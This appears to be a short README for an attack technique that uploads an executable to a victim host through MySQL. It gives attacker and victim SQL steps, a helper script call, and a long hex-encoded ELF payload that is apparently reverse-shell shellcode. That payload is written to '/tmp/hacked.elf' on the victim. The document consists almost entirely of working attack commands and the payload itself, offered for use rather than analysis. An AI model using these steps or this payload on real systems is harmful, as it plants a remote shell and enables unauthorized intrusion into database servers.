# mysql-binary-upload
Upload a binary file through MySQL to a remote host

## Attacker
```mysql
SELECT HEX(LOAD_FILE('/home/malice/shell-x86.elf')) INTO DUMPFILE '/home/malice/shell.dmp';
```

```python3
python dmp-helper.py shell.dmp
```

## Victim
```mysql
CREATE TABLE tmp(chunk longtext);
```

```mysql
INSERT INTO tmp(chunk) VALUES(0x374634353443343630313031303130303030303030303030303030303030303030323030303330303031303030303030353438303034303833343030303030303030303030303030303030303030303033343030323030303031303030303030303030303030303030313030303030303030303030303030303038303034303830303830303430384346303030303030344130313030303030373030303030303030313030303030364130413545333144424637453335333433353336413032423036363839453143443830393735423638433041383830383036383032303030314242383945313641363635383530353135373839453134334344383038354330373931393445373433443638413230303030303035383641303036413035383945333331433943443830383543303739424445423237423230374239303031303030303038394533433145423043433145333043423037444344383038354330373831303542383945313939423232344230303343443830383543303738303246464531423830313030303030304242303130303030303043443830);
```

```mysql
SELECT UNHEX(chunk) FROM tmp INTO DUMPFILE '/tmp/hacked.elf';
```
